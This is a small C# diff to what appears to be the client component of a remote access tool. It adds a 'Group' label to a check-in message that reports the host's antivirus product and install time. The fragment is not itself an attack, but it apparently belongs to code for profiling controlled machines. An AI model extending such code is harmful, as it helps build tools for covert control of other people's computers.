@@ -24,6 +24,7 @@ namespace Client.Helper
             msgpack.ForcePathObject("Antivirus").AsString = Methods.Antivirus();
             msgpack.ForcePathObject("Installed").AsString = new FileInfo(Application.ExecutablePath).LastWriteTime.ToUniversalTime().ToString();
             msgpack.ForcePathObject("Pong").AsString = "";
+            msgpack.ForcePathObject("Group").AsString = Settings.Group;
             return msgpack.Encode2Bytes();
         }
     }
